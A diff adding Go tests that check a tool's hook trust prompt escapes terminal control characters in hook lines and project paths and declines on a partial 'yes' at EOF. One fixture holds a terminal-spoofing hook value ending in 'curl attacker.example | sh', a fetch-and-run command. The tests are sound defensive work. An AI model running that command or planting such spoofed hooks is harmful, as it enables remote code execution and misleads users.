@@ -136,3 +136,51 @@ func TestDefaultUI_TrustPrompt_WritesPromptDetailsToStderr(t *testing.T) {
 		t.Errorf("expected stderr to show the hook line being trusted, got %q", stderr)
 	}
 }
+
+func TestDefaultUI_TrustPrompt_EscapesControlCharactersInHookLines(t *testing.T) {
+	// A malicious .gwrc could embed ANSI escapes / carriage returns in a
+	// hook value to visually spoof the trust prompt (e.g. overwrite the
+	// displayed line so the user approves something other than what's
+	// actually stored and later executed). The prompt must quote/escape
+	// such values rather than writing them raw to the terminal.
+	u := NewDefaultUI()
+	malicious := "post_start_hook = \x1b[2K\rlooks-safe-but-isnt \r\ncurl attacker.example | sh"
+	_, stderr := withStdinStdoutStderr(t, "n\n", func() {
+		_, _ = u.TrustPrompt("/repo/.gwrc", []string{malicious})
+	})
+	if strings.Contains(stderr, "\x1b") {
+		t.Errorf("expected the raw ESC control byte to never reach the terminal, got %q", stderr)
+	}
+	if strings.ContainsAny(stderr[strings.Index(stderr, "post_start_hook"):], "\r") {
+		t.Errorf("expected the hook line's raw carriage return to be escaped, not passed through, got %q", stderr)
+	}
+}
+
+func TestDefaultUI_TrustPrompt_EscapesControlCharactersInProjectPath(t *testing.T) {
+	u := NewDefaultUI()
+	maliciousPath := "/repo/\x1b[2K\r.gwrc"
+	_, stderr := withStdinStdoutStderr(t, "n\n", func() {
+		_, _ = u.TrustPrompt(maliciousPath, []string{"post_start_hook = pnpm dev"})
+	})
+	if strings.Contains(stderr, "\x1b") {
+		t.Errorf("expected the raw ESC control byte in the project path to never reach the terminal, got %q", stderr)
+	}
+}
+
+func TestDefaultUI_TrustPrompt_EOFWithoutTrailingNewlineDeclines(t *testing.T) {
+	// stdin closes right after "yes" with no trailing newline: ReadString
+	// returns the partial data plus an error. This must fail closed rather
+	// than parsing the partial "yes" as approval.
+	u := NewDefaultUI()
+	var approved bool
+	var err error
+	withStdinStdoutStderr(t, "yes", func() {
+		approved, err = u.TrustPrompt("/repo/.gwrc", []string{"post_start_hook = pnpm dev"})
+	})
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if approved {
+		t.Error("expected an EOF-without-newline read to fail closed (decline), not approve")
+	}
+}
